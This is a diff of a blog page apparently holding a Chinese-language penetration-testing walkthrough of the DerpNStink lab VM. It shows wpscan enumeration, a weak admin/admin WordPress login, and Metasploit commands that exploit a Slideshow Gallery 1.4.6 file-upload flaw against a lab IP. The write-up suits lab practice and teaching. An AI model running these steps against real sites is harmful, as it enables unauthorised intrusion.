@@ -1866,10 +1866,10 @@ padBuster.pl url plaintext[String] Block_Size -encoding x
 <h1 id="漏洞识别"><a href="#漏洞识别" class="headerlink" title="漏洞识别"></a>漏洞识别</h1><h3 id="wpscan"><a href="#wpscan" class="headerlink" title="wpscan"></a>wpscan</h3><p>针对&#x2F;weblog的wordpress进行wpscan</p>
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wpscan --url http://derpnstink.local/weblog/ --enumerate vp,vt,u --max-threads 3 --force</span><br></pre></td></tr></table></figure>
 <ul>
-<li>这里识别到了用户admin<br>![[Pasted image 20260428161957.png]]<br>尝试弱口令<br>得到admin&#x2F;admin能够登陆<br><img src="https://raw.githubusercontent.com/M1ntIce/image/master/20260428162101008.png"></li>
+<li>这里识别到了用户admin<img src="https://raw.githubusercontent.com/M1ntIce/image/master/20260519150542128.png"><br>尝试弱口令<br>得到admin&#x2F;admin能够登陆<br><img src="https://raw.githubusercontent.com/M1ntIce/image/master/20260428162101008.png"></li>
 </ul>
 <figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">wpscan --url http:<span class="regexp">//</span>derpnstink.local<span class="regexp">/weblog/</span>  </span><br></pre></td></tr></table></figure>
-<p>![[Pasted image 20260428172157.png]]<br>这里识别到了：<code>Slideshow Gallery 版本1.4.6</code><br>msf搜索一下历史漏洞：</p>
+<p><img src="https://raw.githubusercontent.com/M1ntIce/image/master/20260519150415130.png"><br>这里识别到了：<code>Slideshow Gallery 版本1.4.6</code><br>msf搜索一下历史漏洞：</p>
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msfconsole </span><br><span class="line">search Slideshow Gallery</span><br><span class="line">use 0</span><br><span class="line">show options</span><br></pre></td></tr></table></figure>
 <p>存在文件上传<br><img src="https://raw.githubusercontent.com/M1ntIce/image/master/20260512113225303.png"></p>
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">set</span> rhosts 10.200.1.3</span><br><span class="line"><span class="built_in">set</span> targeturi /weblog</span><br><span class="line"><span class="built_in">set</span> wp_user admin</span><br><span class="line"><span class="built_in">set</span> wp_password admin </span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
